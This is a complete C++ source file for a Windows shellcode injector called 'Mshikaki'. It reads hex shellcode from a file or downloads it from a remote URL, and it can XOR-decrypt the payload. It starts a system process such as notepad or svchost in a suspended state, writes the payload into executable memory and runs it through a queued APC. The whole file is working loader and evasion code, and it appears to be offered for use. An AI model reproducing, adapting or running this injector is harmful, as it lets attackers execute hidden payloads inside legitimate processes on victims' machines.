#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <iomanip>
#include <tlhelp32.h>
#include <stdlib.h>
#pragma comment(lib, "wininet.lib")

using namespace std;

string banner =
" ##::::'##::'######::'##::::'##:'####:'##:::'##::::'###::::'##:::'##:'####:\n"
" ###::'###:'##... ##: ##:::: ##:. ##:: ##::'##::::'## ##::: ##::'##::. ##::\n"
" ####'####: ##:::..:: ##:::: ##:: ##:: ##:'##::::'##:. ##:: ##:'##:::: ##::\n"
" ## ### ##:. ######:: #########:: ##:: #####::::'##:::. ##: #####::::: ##::\n"
" ##. #: ##::..... ##: ##.... ##:: ##:: ##. ##::: #########: ##. ##:::: ##::\n"
" ##:.:: ##:'##::: ##: ##:::: ##:: ##:: ##:. ##:: ##.... ##: ##:. ##::: ##::\n"
" ##:::: ##:. ######:: ##:::: ##:'####: ##::. ##: ##:::: ##: ##::. ##:'####:\n"
"..:::::..:::......:::..:::::..::....::..::::..::..:::::..::..::::..::....::";

vector<char> Parser(const string& content) {
    ifstream inputFile(content);
    if (!inputFile) {
        cerr << "Failed to open file for reading." << endl;
        return {};
    }

    string line;
    vector<char> bytes;
    while (getline(inputFile, line)) {
        for (unsigned int i = 0; i < line.length(); i += 2) {
            string byteString = line.substr(i, 2);
            char byte = static_cast<char>(strtol(byteString.c_str(), NULL, 16));
            bytes.push_back(byte);
        }
    }
    // cout << "Size of the bytes: " << bytes.size() << endl;
    return bytes;
}

void XOR(char* data, size_t data_len, const char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; ++i) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

BOOL Injector(HANDLE hProcess, HANDLE hThread, const vector<char>& buf) {
    SIZE_T shellSize = buf.size();
    wprintf(L"[+] Allocating memory\n");

    LPVOID shellAddress = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (shellAddress == NULL) return FALSE;
    wprintf(L"[+] Writing shellcode into the process memory \n");

    if (WriteProcessMemory(hProcess, shellAddress, buf.data(), shellSize, NULL) == 0) return FALSE;

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    wprintf(L"[+] Queueing APC \n");

    QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);

    return TRUE;
}

bool FetchRemoteShellcode(const string& url, vector<char>& outShellcode) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char buffer[1024];

    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }

    hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outShellcode.insert(outShellcode.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    //Calling InternetSetOptionW with the INTERNET_OPTION_SETTINGS_CHANGED flag will cause the system to update the cached version of its internet settings and thus resulting in the connections saved by WinInet being closed
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    return true;
}

void PrintHelpMenu(const string& programName) {
    cout << "Usage: " << programName << " [options]" << endl;
    cout << "Options:" << endl;
    cout << "  -i <filename> : Input file with shellcode in hex format" << endl;
    cout << "  -u <url>      : Fetch remote shellcode from the specified URL in hex format" << endl;
    cout << "  -p <process>  : Name of a process (optional, default is notepad)" << endl;
    cout << "  -x <key>      : Apply XOR decryption with the specified key (optional)" << endl;
    cout << "  -h            : Display this help menu" << endl;
    cout << "Example Usage: Mshikaki.exe -i input.txt -x SAUDISAUDI -p svchost.exe. \n  Mshikaki.exe -u input.txt " << endl; 
}

int main(int argc, char* argv[]) {
    cout << banner << endl;
    string inputContent;
    string remoteUrl;
    vector<char> xorKey;
    string processPath = "C:\\Windows\\System32\\notepad.exe"; // Default process path
    bool path = false;
    string actproc;
    bool useXOR = false;


    for (int i = 1; i < argc; ++i) {
        string argument = argv[i];
        if (argument == "-i" && i + 1 < argc) {
            inputContent = argv[i + 1];
        }
        else if (argument == "-u" && i + 1 < argc) {
            remoteUrl = argv[i + 1];
        }
        else if (argument == "-x" && i + 1 < argc) {
            string keyString = argv[i + 1];
            xorKey = vector<char>(keyString.begin(), keyString.end());
            useXOR = true;
        }
        else if (argument == "-h") {
            PrintHelpMenu(argv[0]);
            return 0;
        }
        else if (argument == "-p" && i + 1 < argc) {
            processPath = "C:\\Windows\\System32\\" + string(argv[i + 1]);
            actproc = string(argv[i + 1]);
            path = true;
        }

    }

    vector<char> payload;

    if (!inputContent.empty()) {
        payload = Parser(inputContent);
    }
    else if (!remoteUrl.empty()) {
        if (!FetchRemoteShellcode(remoteUrl, payload)) {
            cout << "Failed to fetch remote shellcode." << endl;
            return 1;
        }
    }
    else {
        cout << "Please specify an input file or remote file location with hex shellcode. Use -h for help menu." << endl;
        return 1;
    }

    if (useXOR && !xorKey.empty()) {
        XOR(payload.data(), payload.size(), xorKey.data(), xorKey.size());
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(processPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        wprintf(L"ERROR: (%d) Unable to Create Process\n", GetLastError());
        return 1;
    }
    else if (path == true){
        cout << "[+] Creating " << actproc << " process in a suspended state \n";
    }

    if (!Injector(pi.hProcess, pi.hThread, payload)) {
        wprintf(L"ERROR: (%d) Unable to Inject into Process\n", GetLastError());
        return 1;
    }

    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);

    return 0;
}

